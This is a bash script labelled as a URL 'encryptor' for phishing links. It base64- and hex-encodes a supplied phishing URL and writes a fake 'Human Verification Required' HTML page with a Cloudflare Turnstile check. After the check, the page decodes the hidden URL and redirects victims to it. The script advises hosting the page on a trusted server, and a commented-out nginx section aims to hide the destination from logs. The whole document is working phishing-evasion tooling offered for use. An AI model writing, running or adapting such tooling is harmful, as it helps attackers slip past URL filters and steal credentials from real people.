#!/bin/bash


if [ -z "$1" ]; then
    echo "Usage: ./url_encryptor.sh <phishing_url>"
    exit 1
fi

URL="$1"
DOMAIN=$(echo "$URL" | awk -F/ '{print $3}')

echo "🔒 Processing URL: $URL"
echo "----------------------------------------"

# 1. Base64 Encoding
B64_URL=$(echo -n "$URL" | base64 | tr -d '\n')
echo "✅ Base64 Encoded (Simple):"
echo "   $B64_URL"
echo ""

# 2. Hex Encoding
HEX_URL=$(echo -n "$URL" | python -c "import sys; print(sys.stdin.read().encode().hex())")
echo "✅ Hex Encoded:"
echo "   $HEX_URL"
echo ""

# 3. HTML Redirector (Base64 Obfuscated)
echo "✅ Generating Stealth HTML Redirector (Base64 Rules)..."
cat > stealth_redirect.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        #verification-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .verification-box {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid #e1e4e8;
        }
        h2 { margin-top: 0; color: #1a1f36; font-size: 1.5rem; margin-bottom: 0.5rem; }
        p { color: #4f566b; margin-bottom: 1.5rem; line-height: 1.5; }
        #turnstile-widget { margin: 0 auto; display: flex; justify-content: center; }
    </style>
    <script>
        function secure_redirect() {
            var encoded = "$B64_URL";
            var decoded = atob(encoded);
            window.location.replace(decoded);
        }

        window.onloadTurnstileCallback = function () {
            turnstile.render("#turnstile-widget", {
                sitekey: "0x4AAAAAABfEH8vkTJ0JVBb5",
                callback: function (token) {
                    console.log(\`Challenge Success \${token}\`);
                    setTimeout(() => {
                        document.getElementById("verification-overlay").style.display = "none";
                        secure_redirect();
                    }, 500);
                },
            });
        };
    </script>
</head>
<body>
    <div id="verification-overlay">
      <div class="verification-box">
        <h2>Human Verification Required</h2>
        <p>Please complete this quick verification to continue.</p>
        <div id="turnstile-widget"></div>
      </div>
    </div>
</body>
</html>
EOF
echo "   -> Created 'stealth_redirect.html'"
echo "   -> This file contains the Base64 string and auto-decodes it!"
echo "   -> Host this file on any trusted server."
echo "----------------------------------------"

# # 4. Nginx Hex Config (Advanced)
# echo "✅ Generating Nginx Config (Hex Obfuscation)..."
# # Convert full hex string to \xHH format for Nginx
# NGINX_HEX=""
# # Loop through hex string 2 chars at a time
# for (( i=0; i<${#HEX_URL}; i+=2 )); do
#   NGINX_HEX="${NGINX_HEX}\\x${HEX_URL:$i:2}"
# done

# cat > nginx_obfuscated.conf << EOF
# # Add this to your Nginx server block
# # It matches the hex-encoded string in the URL but looks like random bytes to logs

# location ~* "/secure_login" {
#     # Redirects to the hex-decoded destination
#     # Browser doesn't see the destination until redirect happens
#     return 302 "$URL";
# }

# # OR if you want to match specific hex bytes in the request path to hide the location:
# # location ~* "\x${HEX_URL:0:2}\x${HEX_URL:2:2}..." { ... }
# EOF

# echo "   -> Created 'nginx_obfuscated.conf'"
# echo "   -> Use this snippet in your Nginx config file (e.g. /etc/nginx/sites-available/default)"
# echo "----------------------------------------"
